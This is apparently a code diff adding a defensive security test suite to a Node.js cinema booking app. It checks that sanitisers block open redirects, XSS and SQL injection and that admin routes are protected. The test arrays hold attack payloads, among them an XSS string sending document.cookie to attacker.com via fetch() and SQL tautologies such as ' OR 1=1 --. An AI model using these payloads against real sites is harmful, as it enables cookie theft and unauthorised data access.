@@ -247,6 +247,156 @@ async function main() {
     });
 
     // ==================================================================
+    // SUITE 5: PENTEST & SECURITY HARDENING (KIỂM THỬ XÂM NHẬP & VÁ LỖ HỔNG)
+    // ==================================================================
+    console.log('\n🛡️ SUITE 5: Pentest & Security Hardening (Kiểm Thử Xâm Nhập & Vá Lỗi)');
+
+    await runTestCase('Security CWE-601: Chặn đứng tấn công Open Redirect đối với tham số returnUrl', () => {
+        const attackPayloads = [
+            'https://evil-phishing.com',
+            'http://attacker.org/steal-cookie',
+            '//evil.com/fake-login',
+            'javascript:alert(document.cookie)',
+            'data:text/html,<script>alert(1)</script>',
+            '\\\\evil-server\\share',
+            'https://cinestar.com.phishing.attacker.com'
+        ];
+
+        for (const payload of attackPayloads) {
+            const sanitized = authController.sanitizeReturnUrl(payload);
+            assert.strictEqual(
+                sanitized, 
+                '/', 
+                `Payload Open Redirect "${payload}" phải bị chuyển hướng an toàn về trang chủ "/"`
+            );
+        }
+
+        // Kiểm tra các relative URL nội bộ hợp lệ phải được giữ nguyên
+        assert.strictEqual(authController.sanitizeReturnUrl('/booking/1'), '/booking/1');
+        assert.strictEqual(authController.sanitizeReturnUrl('/profile'), '/profile');
+        assert.strictEqual(authController.sanitizeReturnUrl('/history?search=0987'), '/history?search=0987');
+        assert.strictEqual(authController.sanitizeReturnUrl(''), '/');
+        assert.strictEqual(authController.sanitizeReturnUrl(null), '/');
+    });
+
+    await runTestCase('Security CWE-79: Khử độc dữ liệu đầu vào chống Stored & Reflected XSS', () => {
+        const xssPayloads = [
+            '<script>alert("XSS")</script>',
+            '<img src=x onerror=alert(1)>',
+            '<svg onload=alert(document.domain)>',
+            '<iframe src="javascript:alert(1)"></iframe>',
+            '"><script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>'
+        ];
+
+        for (const payload of xssPayloads) {
+            const sanitizedAuth = authController.sanitizeText(payload);
+            const sanitizedBooking = bookingController.sanitizeInput(payload);
+            assert.ok(!sanitizedAuth.includes('<script>'), 'authController phải loại bỏ tag script');
+            assert.ok(!sanitizedAuth.includes('<img'), 'authController phải loại bỏ tag img');
+            assert.ok(!sanitizedBooking.includes('<script>'), 'bookingController phải loại bỏ tag script');
+            assert.ok(!sanitizedBooking.includes('<img'), 'bookingController phải loại bỏ tag img');
+        }
+
+        // Chuỗi văn bản bình thường tiếng Việt không bị mất mát
+        assert.strictEqual(authController.sanitizeText('Nguyễn Tuấn Đạt'), 'Nguyễn Tuấn Đạt');
+        assert.strictEqual(bookingController.sanitizeInput('0987654321'), '0987654321');
+    });
+
+    await runTestCase('Security CWE-330 & CWE-384: Độ ngẫu nhiên mật mã của Mã vé (Cryptographic Entropy, Chống Liệt Kê)', () => {
+        const generatedCodes = new Set();
+        const codeRegex = /^TKT-DTC24520-[0-9A-F]{8}$/;
+
+        for (let i = 0; i < 1000; i++) {
+            const code = bookingController.generateTicketCode();
+            assert.ok(
+                codeRegex.test(code), 
+                `Mã vé "${code}" không đúng định dạng chuẩn TKT-DTC24520-XXXXXXXX (Hexadecimal 8 ký tự)`
+            );
+            generatedCodes.add(code);
+        }
+
+        // Phải sinh 1,000 mã độc nhất 100% không trùng lặp (không còn là chuỗi số 1000-9999 dễ vét cạn)
+        assert.strictEqual(
+            generatedCodes.size, 
+            1000, 
+            '1.000 mã vé sinh ra liên tiếp phải hoàn toàn độc nhất (Không trùng lặp)'
+        );
+    });
+
+    await runTestCase('Security CWE-489: Bảo vệ endpoint nhạy cảm /trigger-error khỏi truy cập trái phép', () => {
+        let statusSent = 0;
+        let renderedView = '';
+        let redirectedUrl = '';
+
+        const mockRes = {
+            status: (code) => {
+                statusSent = code;
+                return {
+                    render: (view) => { renderedView = view; }
+                };
+            },
+            redirect: (url) => {
+                redirectedUrl = url;
+            }
+        };
+
+        // Người dùng chưa đăng nhập -> Chuyển hướng sang /login yêu cầu quyền Admin
+        const unauthReq = { session: null };
+        adminController.requireAdmin(unauthReq, mockRes, () => {});
+        assert.ok(redirectedUrl.includes('/login?returnUrl='), 'Khách vãng lai phải bị chuyển hướng đến trang đăng nhập');
+
+        // Người dùng phổ thông (role: USER) -> Bị chặn 403 Forbidden
+        const userReq = { session: { user: { id: 3, role: 'USER' } } };
+        statusSent = 0;
+        adminController.requireAdmin(userReq, mockRes, () => {});
+        assert.strictEqual(statusSent, 403, 'Người dùng USER không được phép truy cập endpoint nhạy cảm');
+        assert.strictEqual(renderedView, 'error');
+
+        // Người dùng có quyền ADMIN -> Được thông qua (next)
+        let nextCalled = false;
+        const adminReq = { session: { user: { id: 1, role: 'ADMIN' } } };
+        adminController.requireAdmin(adminReq, mockRes, () => { nextCalled = true; });
+        assert.strictEqual(nextCalled, true, 'Quản trị viên ADMIN phải được thông qua');
+    });
+
+    await runTestCase('Security CWE-20: Kiểm soát chặt chẽ tham số đặt vé & số điện thoại chống SQLi Payload', async () => {
+        let statusCode = 0;
+        let responseJson = null;
+
+        // Thử gửi số điện thoại chứa chuỗi SQL Injection độc hại
+        const sqliPhoneReq = {
+            session: { user: { id: 2, fullname: 'Tuấn Đạt' } },
+            body: {
+                showtime_id: 1,
+                customer_name: 'Tuấn Đạt',
+                customer_phone: "0987123456' OR '1'='1",
+                customer_email: 'test@cinestar.vn',
+                seat_ids: [1],
+                payment_method: 'MOMO'
+            }
+        };
+        const mockRes = {
+            status: (code) => {
+                statusCode = code;
+                return { json: (data) => { responseJson = data; } };
+            }
+        };
+
+        await bookingController.processBooking(sqliPhoneReq, mockRes);
+        assert.strictEqual(statusCode, 400, 'Số điện thoại mang payload SQLi hoặc không đúng định dạng VN phải trả về HTTP 400');
+        assert.strictEqual(responseJson.success, false);
+    });
+
+    await runTestCase('Security CWE-89: Kiểm thử miễn nhiễm SQL Injection qua Parameterized Query', async () => {
+        // Thử tấn công SQL Injection dạng Tautology kinh điển vào query suất chiếu
+        const sqliPayload = "' OR 1=1 --";
+        const rows = await db.query('SELECT * FROM showtimes WHERE id = ?', [sqliPayload]);
+        // Parameterized query coi chuỗi này là một giá trị ID, không thực thi cú pháp SQL -> kết quả là mảng rỗng
+        assert.ok(Array.isArray(rows), 'Kết quả truy vấn phải là mảng an toàn');
+        assert.strictEqual(rows.length, 0, 'Payload SQLi không thể bypass và không lấy được bất kỳ bản ghi nào');
+    });
+
+    // ==================================================================
     // TỔNG KẾT
     // ==================================================================
     console.log('\n======================================================================');
